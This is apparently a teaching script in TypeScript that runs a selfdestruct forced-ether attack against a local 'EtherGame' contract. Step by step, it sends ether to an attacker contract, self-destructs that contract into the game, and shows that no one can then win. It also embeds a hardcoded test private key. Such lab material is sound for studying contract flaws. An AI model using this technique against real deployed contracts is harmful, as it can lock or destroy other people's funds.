import { JsonRpcProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';

import { EtherGame__factory, Attack__factory } from '../types/ethers-contracts';

const provider = new JsonRpcProvider("HTTP://127.0.0.1:8545");
const testPrivKey = "f92208ac8d6a14401d8a3268609f2b5a84c767a37d231eb73c862dd0e4f91b48";
const game = "0x4ef056D0A1C3159d34A651DD311Fd65A0bA40720"
const attack = "0x0DcceF2f982798eAbd4e22C6c36efdbe2C9B5CEE"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);

  
  const gamec = EtherGame__factory.connect(game, provider).connect(alice);
  const attackc = Attack__factory.connect(attack, provider).connect(alice);

  console.log("Transcation 1: transfer 7 eth to game.")
  await alice.sendTransaction({
    to: gamec.address,
    value: toWei(7),
  }).catch(_e => {
    console.log("    The transcation is reverted, which is expected because the contract does not implement a fallback function.");
  });

  console.log("Transcation 2: transfer 1 eth to game with deposit method.")
  // this works 
  await gamec.deposit({
    value: toWei(1)
  });

  console.log("Transcation 3: transfer 7 eth to attacker contract.");
  // we give attack 7eth, he will send these money with selfdestruct
  await alice.sendTransaction({
    to: attackc.address,
    value: toWei(7.03),
  })

  console.log("Transcation 4: attacker contract selfdestructs")
  // Attacker calls selfdestruct, his balance will be transferred to game.
  // These money could ruin this game.
  await attackc.attack();

  console.log("Transcation 5: try to join game.")
  // the game is broken, we will get an error "Game is over" when trying to join.
  // However, no one is the winner.
  await gamec.deposit({
    value: toWei(1)
  }).catch(e => {
    console.log("    Transcation failed with 'Game is over.'. However, there is no winner.")
  })
}

main().catch(e => {
  console.log("Error: " + e)
})
